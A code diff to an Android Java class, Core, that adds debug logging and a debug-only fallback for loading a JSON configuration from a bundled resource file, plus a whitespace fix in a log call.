@@ -430,8 +430,12 @@ public class Core extends Activity implements Runnable {
 	 */
 	public int loadConf() throws GeneralException {
 		boolean loaded = false;
-
 		int ret = ConfType.Error;
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (loadConf): TRY NEWCONF");
+		}
+		
 		// tries to load the file got from the sync, if any.
 		AutoFile file = new AutoFile(Path.conf() + ConfType.NewConf);
 
@@ -450,6 +454,9 @@ public class Core extends Activity implements Runnable {
 
 		// get the actual configuration
 		if (!loaded) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConf): TRY ACTUALCONF");
+			}
 			file = new AutoFile(Path.conf() + ConfType.ActualConf);
 
 			if (file.exists()) {
@@ -463,8 +470,34 @@ public class Core extends Activity implements Runnable {
 			}
 		}
 
+		if (!loaded && Cfg.DEBUG) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConf): TRY JSONCONF");
+			}
+			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
+			String json = new String(resource);
+			// Initialize the configuration object
+
+			if (json != null) {
+				final Configuration conf = new Configuration(json);
+				// Load the configuration
+				loaded = conf.loadConfiguration(true);
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " Info: Json file loaded: " + loaded); //$NON-NLS-1$
+				}
+
+				if (loaded) {
+					ret = ConfType.ResourceJson;
+				}
+			}
+		}
+
 		// tries to load the resource conf
 		if (!loaded) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (loadConf): TRY RESCONF");
+			}
 			// Open conf from resources and load it into resource
 			final byte[] resource = Utils.inputStreamToBuffer(resources.openRawResource(R.raw.config), 0); // config.bin
 
@@ -579,7 +612,7 @@ public class Core extends Activity implements Runnable {
 				} else {
 					if (subAction.considerStop()) {
 						if (Cfg.DEBUG) {
-							Check.log(TAG + " (executeAction): stop" );
+							Check.log(TAG + " (executeAction): stop");
 						}
 						break;
 					}
